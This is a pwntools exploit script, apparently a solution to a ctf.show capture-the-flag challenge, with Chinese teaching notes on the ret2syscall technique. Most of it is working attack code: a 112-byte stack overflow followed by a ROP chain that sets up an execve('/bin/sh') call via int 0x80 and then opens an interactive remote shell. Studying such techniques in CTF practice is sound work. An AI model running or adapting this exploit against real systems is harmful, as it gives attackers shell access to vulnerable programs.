from pwn import *

p = remote('pwn.challenge.ctf.show', 28166)

pop_eax = 0x80bb196
pop_edx_ecx_ebx = 0x806eb90
int_80 = 0x8049421

bin_sh_addr = 0x80BE408

offset = 112

payload = b'a' * offset + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_80)

p.recvuntil('Try to use ret2syscall!\n')
p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2syscall - 系统调用
2. 核心原理：
   - 直接调用系统调用（syscall/int 0x80）
   - 不依赖libc，直接调用内核接口
   - 适用于静态编译或无libc的程序
3. 系统调用流程：
   - 设置系统调用号（eax/rax）
   - 设置参数（ebx/rdi, ecx/rsi等）
   - 执行syscall/int 0x80
4. 常见系统调用：
   - execve(11/59)：执行程序
   - read(3)：读取输入
   - write(4)：输出数据
5. 关键步骤：
   - 构造ROP链设置寄存器
   - 调用syscall执行系统调用
"""
